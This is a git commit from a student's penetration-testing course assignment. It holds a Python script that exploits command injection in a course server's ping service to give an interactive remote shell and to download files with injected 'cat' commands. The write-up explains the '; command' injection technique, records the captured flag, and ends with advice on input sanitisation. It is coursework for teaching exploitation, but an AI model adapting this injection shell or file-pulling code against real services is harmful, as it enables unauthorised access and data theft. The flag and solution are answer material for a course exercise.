9d5238bb7937bcd522ce62192469ef7ab564fad4
Chris Tharratt <crtharratt@gmail.com>
2019-09-27 00:12:18 +0000

    finishg assignment 4

--- week/4/stub.py
+++ week/4/stub.py
@@ -8,30 +8,89 @@
 """
 
 import socket
+import time
 
 host = "wattsamp.net" # IP address here
 port = 1337 # Port here
 
-def execute_cmd(cmd):
-    """
-        Sockets: https://docs.python.org/3/library/socket.html
-        How to use the socket s:
-
-            # Establish socket connection
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((host, port))
-
-            Reading:
-
-                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
-                print(data)             # Prints data
-
-            Sending:
-
-                s.send("something to send\n")   # Send a newline \n at the end of your command
-    """
-    print("IMPLEMENT ME")
-
+def execute_cmd(cmd, pwd):
+    #print("cmd: " + cmd)
+    directory_arr = pwd.split("/")
+    change_directory_cmd = "; cd " + pwd
+    #if pwd != "/":
+    #    for directory in directory_arr:
+    #        if directory != "":
+    #            change_directory_cmd = change_directory_cmd + "cd " + directory + "; "
+        
+    #print change_directory_cmd
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+    data = s.recv(1024)
+    #print (data)
+    cmd = "; " + cmd + "; pwd; " + "\n"
+    cmd = change_directory_cmd + cmd
+    #print("cmd: " + cmd)
+    s.send(cmd)
+    time.sleep(.5)
+    data = s.recv(1024)
+    #print (data)
+    s.close()
+    
+    data_lines = data.splitlines()
+    new_pwd = data_lines[len(data_lines)-1]
+    data = data.replace(new_pwd, "")
+    data = data.rstrip()
+    print (data)
+    return new_pwd
+    
+def print_help():
+    return "Ussage:\n\'Shell\': Drop into an interactive shell and allow users to gracefully exit\n\'pull <remote-path> <local-path>\': Download files\n\'help\': Shows this help menu\n\'quit\': Quit the shell"
+    
+def pull_stuff(cmd_array):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+    data = s.recv(1024)
+    
+    command = "; cat " + cmd_array[1]    
+    s.send(command)
+    time.sleep(.5)
+    data = s.recv(1024)
+    
+    f = open(cmd_array[2], "w+")
+    f.write(data)
+    f.close()
+    s.close()
+    
+def shell_script():
+    pwd = "/"
+    
+    while (True):
+        cmd = raw_input(pwd + "> ")
+        if cmd == "exit":
+            break 
+        else:
+            pwd = execute_cmd(cmd, pwd)
 
 if __name__ == '__main__':
-    print("IMPLEMENT ME")
+    while (True):
+        cmd = raw_input("the_shell> ")
+        if cmd == "exit":
+            break
+        elif cmd == "shell":
+            shell_script()
+        elif cmd == "help":
+            print (print_help())
+        else:
+            cmd_array = cmd.split()
+            if cmd_array[0] == "pull":
+                if len(cmd_array) != 3:
+                    print (print_help())
+                else:
+                    pull_stuff(cmd_array)
+            else:
+                print (print_help())
+                
+               
+    
+    
+    
--- week/4/writeup/README.md
+++ week/4/writeup/README.md
@@ -1,11 +1,11 @@
 # Writeup 2 - Pentesting
 
-Name: *PUT YOUR NAME HERE*
-Section: *PUT YOUR SECTION NUMBER HERE*
+Name: Chris Tharratt
+Section: 0101
 
 I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examination.
 
-Digital acknowledgement: *PUT YOUR NAME HERE*
+Digital acknowledgement: Chris Tharratt
 
 ## Assignment Writeup
 
@@ -13,6 +13,13 @@ Digital acknowledgement: *PUT YOUR NAME HERE*
 
 *Please use this space to writeup your answers and solutions (and how you found them!) for part 1.*
 
+Eric's server runs the linux command `ping -c 2 {inserted hostname}`. The function however, does not do input sanitization. By adding a `;` after our hostname input, we can then add any command line command that we wish. To get to this point, I started out trying some of the shellshock injections from the slides, but then realized that did not make sense for this context of system. Looking up common command injections, I tried inputting `wattsamp.net; echo "Hello"` and was happy to see `Hello` printed to my screen. After finding this, I then inputted commands like `; ls -a` and kept similar commands up until running `; cd home; cat flag.txt` and getting the flag `CMSC389R-{p1ng_as_a_$erv1c3}`.
+
+For Eric, always, __always__ sanitise your user inputs. Never trust any input the user inputs into your program. Additionally, not having your filesystem open to the internet for anyone to connect to would be a solid idea, or at least protected via password or through port 22 over ssh.
+
 ### Part 2 (55 pts)
 
 *Please use this space to detail your approach and solutions for part 2. Don't forget to upload your completed source code to this /writeup directory as well!*
+
+The main problem with implementing a reverse shell utilizing this vulnerability is the fact that the connection resets after each command. This is fine if you are running commands in just the `/` directory, but as soon as you want to branch out you need to save your directory that the command has moved into. My solution was to append `; pwd` to the end of each command run, then use some string manipulation to save the working directory and remove the output from the data outputted to the user. The current directory would be pre-appended to each command in the form of `; cd {curr_pwd}`. From there, the rest of the implementation was fairly straightforward.
+
